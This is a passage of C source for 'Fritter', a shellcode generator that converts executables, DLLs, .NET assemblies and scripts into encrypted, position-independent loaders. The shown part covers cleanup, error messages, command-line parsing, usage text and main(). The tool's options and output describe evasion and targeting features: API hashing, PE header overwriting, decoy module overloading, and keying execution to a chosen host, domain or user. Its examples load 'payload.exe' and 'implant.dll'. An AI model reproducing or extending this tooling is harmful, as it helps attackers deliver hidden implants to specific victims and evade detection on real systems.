              // any failed random draw along the way invalidates the output
              if(err == FRITTER_ERROR_OK && g_rng_failed) err = FRITTER_ERROR_RANDOM;
              if(err == FRITTER_ERROR_OK) {
                if(err == FRITTER_ERROR_OK) {
                  // 7. save loader and any additional files to disk
                  err = save_loader(c);
                }
              }
            }
          }
        }
      }
    }
    // if there was some error, release resources
    if(err != FRITTER_ERROR_OK) {
      FritterDelete(c);
    }
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/**
 * Function: FritterDelete
 * ----------------------------
 *   Releases memory allocated by internal Fritter functions.
 *
 *   INPUT  : Pointer to a Fritter configuration previously used by FritterCreate.
 *
 *   OUTPUT : Fritter error code.
 */
EXPORT_FUNC 
int FritterDelete(PFRITTER_CONFIG c) {
    
    DPRINT("Entering.");
    if(c == NULL) {
      return FRITTER_ERROR_INVALID_PARAMETER;
    }
    // free module
    if(c->mod != NULL) {
      DPRINT("Releasing memory for module.");
      free(c->mod);
      c->mod = NULL;
    }
    // free instance
    if(c->inst != NULL) {
      DPRINT("Releasing memory for configuration.");
      free(c->inst);
      c->inst = NULL;
    }
    // free loader
    if(c->pic != NULL) {
      DPRINT("Releasing memory for loader.");
      free(c->pic);
      c->pic = NULL;
    }
    unmap_file();
    
    DPRINT("Leaving.");
    return FRITTER_ERROR_OK;
}

/**
 * Function: FritterError
 * ----------------------------
 *   Converts Fritter error code into a string
 *
 *   INPUT  : error code returned by FritterCreate
 *
 *   OUTPUT : error code as a string 
 */
EXPORT_FUNC
const char *FritterError(int err) {
    static const char *str="N/A";
    
    switch(err) {
      case FRITTER_ERROR_OK:
        str = "No error.";
        break;
      case FRITTER_ERROR_FILE_NOT_FOUND:
        str = "File not found.";
        break;
      case FRITTER_ERROR_FILE_EMPTY:
        str = "File is empty.";
        break;
      case FRITTER_ERROR_FILE_ACCESS:
        str = "Cannot open file.";
        break;
      case FRITTER_ERROR_FILE_INVALID:
        str = "File is invalid.";
        break;      
      case FRITTER_ERROR_NET_PARAMS:
        str = "File is a .NET DLL. Fritter requires a class and method.";
        break;
      case FRITTER_ERROR_NO_MEMORY:
        str = "Memory allocation failed.";
        break;
      case FRITTER_ERROR_INVALID_ARCH:
        str = "Invalid architecture specified.";
        break;      
      case FRITTER_ERROR_INVALID_PARAMETER:
        str = "Invalid parameter.";
        break;
      case FRITTER_ERROR_RANDOM:
        str = "Error generating random values.";
        break;
      case FRITTER_ERROR_DLL_FUNCTION:
        str = "Unable to locate DLL function provided. Names are case sensitive.";
        break;
      case FRITTER_ERROR_ARCH_MISMATCH:
        str = "Target architecture cannot support selected DLL/EXE file.";
        break;
      case FRITTER_ERROR_DLL_PARAM:
        str = "You've supplied parameters for an unmanaged DLL. Fritter also requires a DLL function.";
        break;
      case FRITTER_ERROR_HEADERS_INVALID:
        str = "Invalid PE headers preservation option.";
        break;
      case FRITTER_ERROR_INVALID_FORMAT:
        str = "The output format is invalid.";
        break;
      case FRITTER_ERROR_INVALID_ENGINE:
        str = "The compression engine is invalid.";
        break;
      case FRITTER_ERROR_COMPRESSION:
        str = "There was an error during compression.";
        break;
      case FRITTER_ERROR_INVALID_ENTROPY:
        str = "Invalid entropy level specified.";
        break;
      case FRITTER_ERROR_MIXED_ASSEMBLY:
        str = "Mixed (native and managed) assemblies are currently unsupported.";
        break;
      case FRITTER_ERROR_DECOY_INVALID:
        str = "Path of decoy module is invalid.";
        break;
      case FRITTER_ERROR_STATIC_TLS:
        str = "The file uses static thread-local storage (thread_local, __declspec(thread), or MSVC thread-safe local statics). Give it a slot with -l <dll> (see README), or for local statics rebuild the payload with /Zc:threadSafeInit-. Use -a to generate anyway.";
        break;
    }
    DPRINT("Error result : %s", str);
    return str;
}

#ifdef FRITTER_EXE

#define OPT_MAX_STRING 256

#define OPT_TYPE_NONE   1
#define OPT_TYPE_STRING 2
#define OPT_TYPE_DEC    3
#define OPT_TYPE_HEX    4
#define OPT_TYPE_FLAG   5
#define OPT_TYPE_DEC64  6
#define OPT_TYPE_HEX64  7

// structure to hold data of any type
typedef union _opt_arg_t {
    int flag;

    int8_t s8;
    uint8_t u8;
    int8_t *s8_ptr;
    uint8_t *u8_ptr;

    int16_t s16;
    uint16_t u16;
    int16_t *s16_ptr;
    uint16_t *u16_ptr;

    int32_t s32;
    uint32_t u32;
    int32_t *s32_ptr;
    uint32_t *u32_ptr;

    int64_t s64;
    uint64_t u64;
    int64_t *s64_ptr;
    uint64_t *u64_ptr;      

    void *ptr;
    char str[OPT_MAX_STRING+1];
} opt_arg;

typedef void (*void_callback_t)(void);         // execute callback with no return value or argument
typedef int (*arg_callback_t)(opt_arg*,void*); // process argument, optionally store in optarg

// Every switch main() registers. Kept here so the parser can tell an
// option's value from a switch, and reject switches it does not know.
static const char  OPT_VALUE_SHORT[] = "kcdefimjoprxygl";
static const char  OPT_FLAG_SHORT[]  = "h?twba";
static const char *OPT_VALUE_LONG[]  = {
  "headers", "class", "domain", "entropy", "format", "input", "file",
  "method", "function", "decoy", "output", "params", "args", "runtime",
  "exit", "oep", "fork", "chunked", "tls-donor",
  "key-brute", "key-host", "key-domain", "key-user", "key-env", NULL };
static const char *OPT_FLAG_LONG[]   = { "help", "thread", "unicode", "imagebase", "allow-tls", NULL };

// 1 if `a` is a value-taking switch with nothing attached ("-p", "--args"),
// meaning the next argv element is its value.
static int opt_is_bare_value_switch(const char *a) {
    int k;
    if(a[0] != '-') return 0;
    if(a[1] != '-') {
      return a[1] != 0 && a[2] == 0 && strchr(OPT_VALUE_SHORT, a[1]) != NULL;
    }
    for(k = 0; OPT_VALUE_LONG[k] != NULL; k++) {
      if(strcmp(a + 2, OPT_VALUE_LONG[k]) == 0) return 1;
    }
    return 0;
}

// 1 if argv[idx] is the value of the switch before it, so it must not
// be parsed as a switch itself (e.g. the "-e 1" in: -p "-e 1").
static int arg_is_value(char *argv[], int idx) {
    int j = 1;
    while(j < idx) {
      if(opt_is_bare_value_switch(argv[j])) {
        if(j + 1 == idx) return 1;
        j += 2;
      } else j++;
    }
    return 0;
}

// Exit with an error on any switch that no get_opt() call would accept.
static void reject_unknown_opts(int argc, char *argv[]) {
    int i, k, known;
    for(i = 1; i < argc; i++) {
      const char *a = argv[i];
      if(a[0] != '-' || arg_is_value(argv, i)) continue;
      known = 0;
      if(a[1] != '-') {
        known = a[1] != 0 && (strchr(OPT_VALUE_SHORT, a[1]) != NULL ||
                              strchr(OPT_FLAG_SHORT,  a[1]) != NULL);
      } else {
        for(k = 0; !known && OPT_VALUE_LONG[k] != NULL; k++) {
          size_t l = strlen(OPT_VALUE_LONG[k]);
          known = !strncmp(a + 2, OPT_VALUE_LONG[k], l) && (a[2 + l] == 0 || a[2 + l] == '=' || a[2 + l] == ':');
        }
        for(k = 0; !known && OPT_FLAG_LONG[k] != NULL; k++)
          known = !strcmp(a + 2, OPT_FLAG_LONG[k]);
      }
      if(!known) {
        fprintf(stderr, "  ERROR: Unknown option: %s\n", a);
        exit(1);
      }
    }
}

static int get_opt(
  int argc,         // total number of elements in argv
  char *argv[],     // argument array
  int arg_type,     // type of argument expected (none, flag, decimal, hexadecimal, string)
  void *output,     // pointer to variable that stores argument
  char *short_opt,  // short form of option. e.g: -a
  char *long_opt,   // long form of option. e.g: --arch
  void *callback)   // callback function to process argument
{
    int  valid = 0, i, req = 0, opt_len, opt_type;
    char *args=NULL, *opt=NULL, *arg=NULL, *tmp=NULL;
    opt_arg *optarg = (opt_arg*)output;
    void_callback_t void_cb;
    arg_callback_t  arg_cb;
    
    // perform some basic validation
    if(argc <= 1) return 0;
    if(argv == NULL) return 0;
    
    if(arg_type != OPT_TYPE_NONE   &&
       arg_type != OPT_TYPE_STRING &&
       arg_type != OPT_TYPE_DEC    &&
       arg_type != OPT_TYPE_HEX    &&
       arg_type != OPT_TYPE_FLAG) return 0;
    
    DPRINT("Arg type for %s, %s : %s",
      short_opt != NULL ? short_opt : "N/A",
      long_opt != NULL ? long_opt : "N/A",
      arg_type == OPT_TYPE_NONE ? "None" : 
      arg_type == OPT_TYPE_STRING ? "String" :
      arg_type == OPT_TYPE_DEC ? "Decimal" :
      arg_type == OPT_TYPE_HEX ? "Hexadecimal" :
      arg_type == OPT_TYPE_FLAG ? "Flag" : "Unknown");
      
    // for each argument in array
    for(i=1; i<argc && !valid; i++) {
      // set the current argument to examine
      arg = argv[i];
      // if it doesn't contain a switch, skip it
      if(*arg != '-') continue;
      // the value of a preceding switch is never a switch itself
      if(arg_is_value(argv, i)) continue;
      // we have a switch. initially, we assume short form
      arg++;
      opt_type = 0;
      // long form? skip one more and change the option type
      if(*arg == '-') {
        arg++;
        opt_type++;
      }
      
      // is an argument required by the user?
      req = ((arg_type != OPT_TYPE_NONE) && (arg_type != OPT_TYPE_FLAG));
      // use short or long form for current argument being examined
      opt = (opt_type) ? long_opt : short_opt;
      // if no form provided by user for current argument, skip it
      if(opt == NULL) continue;
      // copy string to dynamic buffer
      opt_len = strlen(opt);
      if(opt_len == 0) continue;
      
      tmp = calloc(sizeof(uint8_t), opt_len + 1);
      if(tmp == NULL) {
        DPRINT("Unable to allocate memory for %s.\n", opt);
        continue;
      } else {
        strcpy(tmp, opt);
      }
      // tokenize the string.
      opt = strtok(tmp, ";");
      // while we have options
      while(opt != NULL && !valid) {
        // get the length
        opt_len = strlen(opt);
        // do we have a match? A long option must be the whole name, or the
        // name followed by its value (--name=value, --name:value).
        if(!strncmp(opt, arg, opt_len) &&
           (!opt_type || arg[opt_len] == 0 || arg[opt_len] == '=' || arg[opt_len] == ':')) {
          //
          // at this point, we have a valid matching argument
          // if something fails from here on in, return invalid
          // 
          // skip the option
          arg += opt_len;
          // an argument is *not* required
          if(!req) {
            // so is the next byte non-zero? return invalid
            if(*arg != 0) return 0;
          } else {
            // an argument is required
            // if the next byte is a colon or assignment operator, skip it.
            if(*arg == ':' || *arg == '=') arg++;
         
            // if the next byte is zero
            if(*arg == 0) { 
              // and no arguments left. return invalid
              if((i + 1) >= argc) return 0;
              args = argv[i + 1];
            } else {
              args = arg;
            }
          }
          // end loop
          valid = 1;
          break;
        }
        opt = strtok(NULL, ";");
      }
      if(tmp != NULL) free(tmp);
    }
    
    // if valid option found
    if(valid) {
      DPRINT("Found match");
      // ..and a callback exists
      if(callback != NULL) {
        // if we have a parameter
        if(args != NULL) {
          DPRINT("Executing callback with %s.", args);
          // execute with parameter
          arg_cb = (arg_callback_t)callback;
          arg_cb(optarg, args);
        } else {
          DPRINT("Executing callback.");
          // otherwise, execute without
          void_cb = (void_callback_t)callback;
          void_cb();
        }
      } else {
        // there's no callback, try process ourselves
        if(args != NULL) {
          DPRINT("Parsing %s\n", args);
          switch(arg_type) {
            case OPT_TYPE_DEC:
            case OPT_TYPE_HEX:
              DPRINT("Converting %s to 32-bit binary", args);
              optarg->u32 = strtoul(args, NULL, arg_type == OPT_TYPE_DEC ? 10 : 16);
              break;
            case OPT_TYPE_DEC64:
            case OPT_TYPE_HEX64:
              DPRINT("Converting %s to 64-bit binary", args);
              optarg->u64 = strtoull(args, NULL, arg_type == OPT_TYPE_DEC64 ? 10 : 16);
              break;
            case OPT_TYPE_STRING:
              DPRINT("Copying %s to output", args);
              // destination fields are OPT_MAX_STRING bytes; refuse rather
              // than truncate a path or leave the string unterminated
              if(strlen(args) >= OPT_MAX_STRING) {
                fprintf(stderr, "  ERROR: Value too long (max %d characters): %s\n",
                        OPT_MAX_STRING - 1, args);
                exit(1);
              }
              strcpy(optarg->str, args);
              break;
          }
        } else {
          // there's no argument, just set the flag
          DPRINT("Setting flag");
          optarg->flag = 1;
        }
      }
    }
    // return result
    return valid;
}

static int validate_exit(opt_arg *arg, void *args) {
    char *str = (char*)args;
    
    arg->u32 = 0;
    if(str == NULL) return 0;
    
    if(strlen(str) == 1 && isdigit((int)*str)) {
      arg->u32 = atoi(str);
    } else {
      if(!strcasecmp("thread", str)) {
        arg->u32 = FRITTER_OPT_EXIT_THREAD;
      } else
      if(!strcasecmp("process", str)) {
        arg->u32 = FRITTER_OPT_EXIT_PROCESS;
      } else
      if(!strcasecmp("block", str)) {
        arg->u32 = FRITTER_OPT_EXIT_BLOCK;
      }
    }
    
    switch(arg->u32) {
      case FRITTER_OPT_EXIT_THREAD:
      case FRITTER_OPT_EXIT_PROCESS:
      case FRITTER_OPT_EXIT_BLOCK:
        break;
      default: {
        printf("WARNING: Invalid exit option specified: %"PRId32" -- setting to thread\n", arg->u32);
        arg->u32 = FRITTER_OPT_EXIT_THREAD;
      }
    }
    return 1;
}
 
static int validate_entropy(opt_arg *arg, void *args) {
    char *str = (char*)args;
    
    arg->u32 = 0;
    if(str == NULL) {
      DPRINT("NULL argument.");
      return 0;
    }
    if(strlen(str) == 1 && isdigit((int)*str)) {
      DPRINT("Converting %s to number.", str);
      arg->u32 = strtoul(str, NULL, 10);
    } else {
      if(!strcasecmp("none", str)) {
        arg->u32 = FRITTER_ENTROPY_NONE;
      } else
      if(!strcasecmp("low", str)) {
        arg->u32 = FRITTER_ENTROPY_RANDOM;
      } else
      if(!strcasecmp("full", str)) {
        arg->u32 = FRITTER_ENTROPY_DEFAULT;
      }
    }
    
    // validate
    switch(arg->u32) {
      case FRITTER_ENTROPY_NONE:
      case FRITTER_ENTROPY_RANDOM:
      case FRITTER_ENTROPY_DEFAULT:
        break;
      default: {
        printf("WARNING: Invalid entropy option specified: %"PRId32" -- setting to default\n", arg->u32);
        arg->u32 = FRITTER_ENTROPY_DEFAULT;
      }
    }
    return 1;
}

// callback to validate format
static int validate_format(opt_arg *arg, void *args) {
    char *str = (char*)args;
    
    arg->u32 = 0;
    if(str == NULL) return 0;
    
    // if it's a single digit, return it as binary
    if(strlen(str) == 1 && isdigit((int)*str)) {
      arg->u32 = atoi(str);
    } else {
      // otherwise, try map it to digit
      if(!strcasecmp("bin", str)) {
        arg->u32 = FRITTER_FORMAT_BINARY;
      } else
      if(!strcasecmp("base64", str)) {
        arg->u32 = FRITTER_FORMAT_BASE64;
      } else
      if(!strcasecmp("c", str)) {
        arg->u32 = FRITTER_FORMAT_C;
      } else 
      if(!strcasecmp("rb", str) || !strcasecmp("ruby", str)) {
        arg->u32 = FRITTER_FORMAT_RUBY;
      } else
      if(!strcasecmp("py", str) || !strcasecmp("python", str)) {
        arg->u32 = FRITTER_FORMAT_PYTHON;
      } else
      if(!strcasecmp("ps", str) || !strcasecmp("powershell", str)) {
        arg->u32 = FRITTER_FORMAT_POWERSHELL;
      } else
      if(!strcasecmp("cs", str) || !strcasecmp("csharp", str)) {
        arg->u32 = FRITTER_FORMAT_CSHARP;
      } else
      if(!strcasecmp("hex", str)) {
        arg->u32 = FRITTER_FORMAT_HEX;
      } else
      if(!strcasecmp("uuid", str)) {
        arg->u32 = FRITTER_FORMAT_UUID;
      }
    }
    // validate
    switch(arg->u32) {
      case FRITTER_FORMAT_BINARY:
      case FRITTER_FORMAT_BASE64:
      case FRITTER_FORMAT_C:
      case FRITTER_FORMAT_RUBY:
      case FRITTER_FORMAT_PYTHON:
      case FRITTER_FORMAT_POWERSHELL:
      case FRITTER_FORMAT_CSHARP:
      case FRITTER_FORMAT_HEX:
      case FRITTER_FORMAT_UUID:
        break;
      default: {
        printf("WARNING: Invalid format specified: %"PRId32" -- setting to binary.\n", arg->u32);
        arg->u32 = FRITTER_FORMAT_BINARY;
      }
    }
    return 1;
}

// calback to validate headers options
static int validate_headers(opt_arg *arg, void *args) {
    char *str = (char*)args;
    
    arg->u32 = 0;
    if(str == NULL) return 0;
    
    // just temporary
    arg->u32 = atoi(str);
    
    return 1;
}

// ANSI color codes
#define C_RST   "\033[0m"
#define C_BOLD  "\033[1m"
#define C_DIM   "\033[2m"
#define C_RED   "\033[91m"
#define C_GRN   "\033[92m"
#define C_YEL   "\033[93m"
#define C_BLU   "\033[94m"
#define C_DBLU  "\033[34m"
#define C_MAG   "\033[95m"
#define C_CYN   "\033[96m"
#define C_WHT   "\033[97m"

static int g_color = 0; // whether ANSI colors are supported

static void enable_ansi(void) {
#if defined(_WIN32) || defined(_WIN64)
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD mode = 0;
    if(hOut != INVALID_HANDLE_VALUE && GetConsoleMode(hOut, &mode)) {
        if(SetConsoleMode(hOut, mode | 0x0004 /*ENABLE_VIRTUAL_TERMINAL_PROCESSING*/)) {
            g_color = 1;
        }
    }
    SetConsoleOutputCP(65001); // UTF-8 for Unicode banner
#else
    // assume terminal supports ANSI on unix
    if(isatty(fileno(stdout))) g_color = 1;
#endif
}

// color-aware printf helpers
#define cprintf(color, fmt, ...) do { \
    if(g_color) printf(color fmt C_RST, ##__VA_ARGS__); \
    else printf(fmt, ##__VA_ARGS__); \
} while(0)

static void print_banner(void) {
    printf("\n");
    if(g_color) {
        printf(C_CYN C_BOLD);
        printf("      ______     _ __  __\n");
        printf("     / ____/____(_) /_/ /____  _____\n");
        printf("    / /_  / ___/ / __/ __/ _ \\/ ___/\n");
        printf("   / __/ / /  / / /_/ /_/  __/ /\n");
        printf("  /_/   /_/  /_/\\__/\\__/\\___/_/" C_RST "\n");
    } else {
        printf("      ______     _ __  __\n");
        printf("     / ____/____(_) /_/ /____  _____\n");
        printf("    / /_  / ___/ / __/ __/ _ \\/ ___/\n");
        printf("   / __/ / /  / / /_/ /_/  __/ /\n");
        printf("  /_/   /_/  /_/\\__/\\__/\\___/_/\n");
    }
    printf("\n");
    if(g_color) {
        printf(C_DIM "  PIC Shellcode Generator | x64\n");
        printf("  Built " __DATE__ " " __TIME__ C_RST "\n");
    } else {
        printf("  PIC Shellcode Generator | x64\n");
        printf("  Built " __DATE__ " " __TIME__ "\n");
    }
    printf("\n");
}

static void usage (void) {
    if(g_color) {
        printf(C_WHT C_BOLD "  USAGE" C_RST C_DIM ":  " C_RST "fritter " C_CYN "[options]" C_RST " -i <EXE/DLL/VBS/JS>\n\n");

        printf(C_YEL "  INPUT" C_RST "\n");
        printf("    -i, --input  <path>       " C_DIM "Input file to execute in-memory" C_RST "\n");
        printf("    -p, --args   <args>       " C_DIM "Parameters / command line for target" C_RST "\n");
        printf("    -c, --class  <name>       " C_DIM "Class name (required for .NET DLL)" C_RST "\n");
        printf("    -m, --method <name>       " C_DIM "Method or function for DLL" C_RST "\n");
        printf("    -r, --runtime <ver>       " C_DIM "CLR runtime version" C_RST "\n");
        printf("    -w, --unicode             " C_DIM "Pass command line as UNICODE" C_RST "\n");
        printf("    -t, --thread              " C_DIM "Run unmanaged EXE entrypoint as thread" C_RST "\n");
        printf("    -b, --imagebase           " C_DIM "EXE is the process image while it runs (resources; use with -k 2)" C_RST "\n");
        printf("    -l, --tls-donor <dll>     " C_DIM "Static TLS for the payload, borrowed from this DLL on the target" C_RST "\n");
        printf("    -a, --allow-tls           " C_DIM "Accept a payload that uses static TLS without a slot (at your own risk)" C_RST "\n\n");

        printf(C_YEL "  KEY" C_RST "\n");
        printf("    --key-brute <bits>        " C_DIM "Key bits the loader finds by trial; default %d, 0 = none (key stored whole)" C_RST "\n", FRITTER_KEY_BRUTE_DEFAULT);
        printf("    --key-host <name>         " C_DIM "Runs only where COMPUTERNAME is <name>" C_RST "\n");
        printf("    --key-domain <name>       " C_DIM "Runs only where USERDNSDOMAIN is <name>" C_RST "\n");
        printf("    --key-user <name>         " C_DIM "Runs only where USERNAME is <name>" C_RST "\n");
        printf("    --key-env <NAME=VALUE>    " C_DIM "Runs only where that environment variable has that value" C_RST "\n\n");

        printf(C_YEL "  OUTPUT" C_RST "\n");
        printf("    -o, --output <path>       " C_DIM "Output file (default: loader.bin)" C_RST "\n");
        printf("    -f, --format <1-9>        " C_DIM "1=Bin 2=B64 3=C 4=Ruby 5=Py 6=PS 7=C# 8=Hex 9=UUID" C_RST "\n");
        printf("    -x, --exit   <1-3>        " C_DIM "1=Thread (default) 2=Process 3=Block" C_RST "\n");
        printf("    -y, --fork   <offset>     " C_DIM "Fork thread, continue at RVA offset" C_RST "\n\n");

        printf(C_YEL "  LOADER" C_RST "\n");
        printf("    -e, --entropy <1-3>       " C_DIM "1=None 2=Random names 3=Names+Crypto (default)" C_RST "\n");
        printf("    -k, --headers <1-2>       " C_DIM "1=Overwrite (default) 2=Keep all" C_RST "\n");
        printf("    -d, --domain  <name>      " C_DIM "AppDomain name for .NET" C_RST "\n");
        printf("    -j, --decoy   <path>      " C_DIM "Decoy module for Module Overloading" C_RST "\n\n");

        printf(C_WHT C_BOLD "  EXAMPLES" C_RST "\n");
        printf(C_DIM "    fritter -i payload.exe\n");
        printf("    fritter -i implant.dll -m RunMain -p \"arg1 arg2\"\n");
        printf("    fritter -i loader.dll -c TestClass -m Run" C_RST "\n");
    } else {
        printf("  USAGE:  fritter [options] -i <EXE/DLL/VBS/JS>\n\n");

        printf("  INPUT\n");
        printf("    -i, --input  <path>       Input file to execute in-memory\n");
        printf("    -p, --args   <args>       Parameters / command line for target\n");
        printf("    -c, --class  <name>       Class name (required for .NET DLL)\n");
        printf("    -m, --method <name>       Method or function for DLL\n");
        printf("    -r, --runtime <ver>       CLR runtime version\n");
        printf("    -w, --unicode             Pass command line as UNICODE\n");
        printf("    -t, --thread              Run unmanaged EXE entrypoint as thread\n");
        printf("    -b, --imagebase           EXE is the process image while it runs (resources; use with -k 2)\n");
        printf("    -l, --tls-donor <dll>     Static TLS for the payload, borrowed from this DLL on the target\n");
        printf("    -a, --allow-tls           Accept a payload that uses static TLS without a slot (at your own risk)\n\n");

        printf("  KEY\n");
        printf("    --key-brute <bits>        Key bits the loader finds by trial; default %d, 0 = none (key stored whole)\n", FRITTER_KEY_BRUTE_DEFAULT);
        printf("    --key-host <name>         Runs only where COMPUTERNAME is <name>\n");
        printf("    --key-domain <name>       Runs only where USERDNSDOMAIN is <name>\n");
        printf("    --key-user <name>         Runs only where USERNAME is <name>\n");
        printf("    --key-env <NAME=VALUE>    Runs only where that environment variable has that value\n\n");

        printf("  OUTPUT\n");
        printf("    -o, --output <path>       Output file (default: loader.bin)\n");
        printf("    -f, --format <1-9>        1=Bin 2=B64 3=C 4=Ruby 5=Py 6=PS 7=C# 8=Hex 9=UUID\n");
        printf("    -x, --exit   <1-3>        1=Thread (default) 2=Process 3=Block\n");
        printf("    -y, --fork   <offset>     Fork thread, continue at RVA offset\n\n");

        printf("  LOADER\n");
        printf("    -e, --entropy <1-3>       1=None 2=Random names 3=Names+Crypto (default)\n");
        printf("    -k, --headers <1-2>       1=Overwrite (default) 2=Keep all\n");
        printf("    -d, --domain  <name>      AppDomain name for .NET\n");
        printf("    -j, --decoy   <path>      Decoy module for Module Overloading\n\n");

        printf("  EXAMPLES\n");
        printf("    fritter -i payload.exe\n");
        printf("    fritter -i implant.dll -m RunMain -p \"arg1 arg2\"\n");
        printf("    fritter -i loader.dll -c TestClass -m Run\n");
    }
    printf("\n");
    exit (0);
}

int main(int argc, char *argv[]) {
    FRITTER_CONFIG c;
    int          err;
    char         *mod_type;
    char         *arch_str = "amd64";

    enable_ansi();
    print_banner();
    
    // zero initialize configuration
    memset(&c, 0, sizeof(c));
    
    // default settings
    c.arch      = FRITTER_ARCH_X64;         // x64 only
    c.headers   = FRITTER_HEADERS_OVERWRITE;// overwrites PE headers
    c.format    = FRITTER_FORMAT_BINARY;    // default output format
    c.entropy   = FRITTER_ENTROPY_DEFAULT;  // enable random names + symmetric encryption by default
    c.exit_opt  = FRITTER_OPT_EXIT_THREAD;  // default behaviour is to exit the thread
    c.unicode   = 0;                      // command line will not be converted to unicode for unmanaged DLL function
    c.chunked   = 1;                      // legacy flag; retained for CLI compat, unused under dispatch
    
    // get options
    reject_unknown_opts(argc, argv);
    get_opt(argc, argv, OPT_TYPE_NONE,   NULL,       "h;?", "help",            usage);
    get_opt(argc, argv, OPT_TYPE_DEC,    &c.headers, "k",   "headers",         validate_headers);
    get_opt(argc, argv, OPT_TYPE_STRING, c.cls,      "c",   "class",           NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.domain,   "d",   "domain",          NULL);
    get_opt(argc, argv, OPT_TYPE_DEC,    &c.entropy, "e",   "entropy",         validate_entropy);
    get_opt(argc, argv, OPT_TYPE_DEC,    &c.format,  "f",   "format",          validate_format);
    get_opt(argc, argv, OPT_TYPE_STRING, c.input,    "i",   "input;file",      NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.method,   "m",   "method;function", NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.decoy,    "j",   "decoy",           NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.output,   "o",   "output",          NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.args,     "p",   "params;args",     NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.runtime,  "r",   "runtime",         NULL);
    get_opt(argc, argv, OPT_TYPE_FLAG,   &c.thread,  "t",   "thread",          NULL);
    get_opt(argc, argv, OPT_TYPE_FLAG,   &c.unicode, "w",   "unicode",         NULL);
    get_opt(argc, argv, OPT_TYPE_FLAG,   &c.imgbase, "b",   "imagebase",       NULL);
    get_opt(argc, argv, OPT_TYPE_FLAG,   &c.allow_tls, "a", "allow-tls",       NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.tls_donor, "l",  "tls-donor",       NULL);
    if(c.allow_tls) printf("  WARNING: static TLS check disabled. Thread-local data in the payload will not work.\n");
    get_opt(argc, argv, OPT_TYPE_DEC,    &c.exit_opt,"x",   "exit",            validate_exit);
    {
      // instance key options; "0" for --key-brute means none
      static const char *kn[3] = { "COMPUTERNAME=", "USERDNSDOMAIN=", "USERNAME=" };
      static char *ko[3] = { "key-host", "key-domain", "key-user" };
      char kv[OPT_MAX_STRING + 1];
      int  kb = -2, ki;
      get_opt(argc, argv, OPT_TYPE_DEC, &kb, NULL, "key-brute", NULL);
      if(kb != -2) c.key_brute = (kb <= 0) ? -1 : kb;
      for(ki = 0; ki < 3; ki++) {
        kv[0] = 0;
        get_opt(argc, argv, OPT_TYPE_STRING, kv, NULL, ko[ki], NULL);
        if(kv[0] == 0) continue;
        if(strlen(kv) + strlen(kn[ki]) >= sizeof(c.key_env[ki])) { fprintf(stderr, "  ERROR: Value too long: %s\n", kv); return 1; }
        strcpy(c.key_env[ki], kn[ki]); strcat(c.key_env[ki], kv);
      }
      kv[0] = 0;
      get_opt(argc, argv, OPT_TYPE_STRING, kv, NULL, "key-env", NULL);
      if(kv[0] != 0) {
        if(strchr(kv, '=') == NULL || kv[0] == '=') { fprintf(stderr, "  ERROR: --key-env takes NAME=VALUE\n"); return 1; }
        strcpy(c.key_env[3], kv);
      }
    }
    get_opt(argc, argv, OPT_TYPE_HEX,    &c.oep,     "y",   "oep;fork",        NULL);
    get_opt(argc, argv, OPT_TYPE_DEC,    &c.chunked, "g",   "chunked",         NULL);
    // no file? show usage and exit
    if(c.input[0] == 0) {
      usage();
    }
    
    // generate loader from configuration
    err = FritterCreate(&c);

    if(err != FRITTER_ERROR_OK) {
      if(g_color) fprintf(stderr, C_RED C_BOLD "  ERROR" C_RST " %s\n", FritterError(err));
      else fprintf(stderr, "  ERROR: %s\n", FritterError(err));
      FritterDelete(&c);
      return 1;
    }
    
    switch(c.mod_type) {
      case FRITTER_MODULE_DLL:
        mod_type = "DLL";
        break;
      case FRITTER_MODULE_EXE:
        mod_type = "EXE";
        break;
      case FRITTER_MODULE_NET_DLL:
        mod_type = ".NET DLL";
        break;
      case FRITTER_MODULE_NET_EXE:
        mod_type = ".NET EXE";
        break;
      case FRITTER_MODULE_VBS:
        mod_type = "VBScript";
        break;
      case FRITTER_MODULE_JS:
        mod_type = "JScript";
        break;
      default:
        mod_type = "Unrecognized";
        break;
    }
    
    // -- result display --
    {
      const char *headers_str =
        c.headers == FRITTER_HEADERS_OVERWRITE ? "Overwrite" :
        c.headers == FRITTER_HEADERS_KEEP      ? "Keep all"  : "Undefined";
      const char *exit_str =
        c.exit_opt == FRITTER_OPT_EXIT_THREAD  ? "Thread" :
        c.exit_opt == FRITTER_OPT_EXIT_PROCESS ? "Process" :
        c.exit_opt == FRITTER_OPT_EXIT_BLOCK   ? "Block"   : "Undefined";

      if(g_color) {
        printf(C_GRN C_BOLD "  SUCCESS" C_RST " Shellcode generated.\n\n");

        printf(C_YEL "  INPUT" C_RST "\n");
        printf("    File        " C_WHT "%s" C_RST "\n", c.input);
        printf("    Type        " C_WHT "%s" C_RST "\n", mod_type);
        printf("    Compressed  " C_WHT "aPLib" C_DIM " (-%"PRId32"%%)" C_RST "\n", file_diff(c.zlen, c.len));
        if(c.mod_type == FRITTER_MODULE_NET_DLL) {
          printf("    Class       " C_WHT "%s" C_RST "\n", c.cls);
          printf("    Method      " C_WHT "%s" C_RST "\n", c.method);
          printf("    Domain      " C_WHT "%s" C_RST "\n", c.domain[0] ? c.domain : "Default");
        } else if(c.mod_type == FRITTER_MODULE_DLL) {
          printf("    Function    " C_WHT "%s" C_RST "\n", c.method[0] ? c.method : "DllMain");
        }
        if(c.args[0]) printf("    Arguments   " C_WHT "%s" C_RST "\n", c.args);
        printf("\n");

        printf(C_YEL "  OUTPUT" C_RST "\n");
        printf("    Shellcode   " C_WHT C_BOLD "%s" C_RST "\n", c.output);
        printf("    Instance    " C_WHT "Embedded" C_RST "\n");
        printf("    Arch        " C_WHT "%s" C_RST "\n", arch_str);
        printf("    Exit        " C_WHT "%s" C_RST "\n", exit_str);
        if(c.oep) printf("    OEP         " C_WHT "0x%"PRIX32 C_RST "\n", c.oep);
        printf("\n");

        printf(C_YEL "  PROTECTIONS" C_RST "\n");
        printf("    Encryption  " C_WHT "Custom ARX (Chaskey-derived, CTR mode)" C_RST "\n");
        printf("    API Hashing " C_WHT "Maru" C_RST "\n");
        printf("    PE Headers  " C_WHT "%s" C_RST "\n", headers_str);
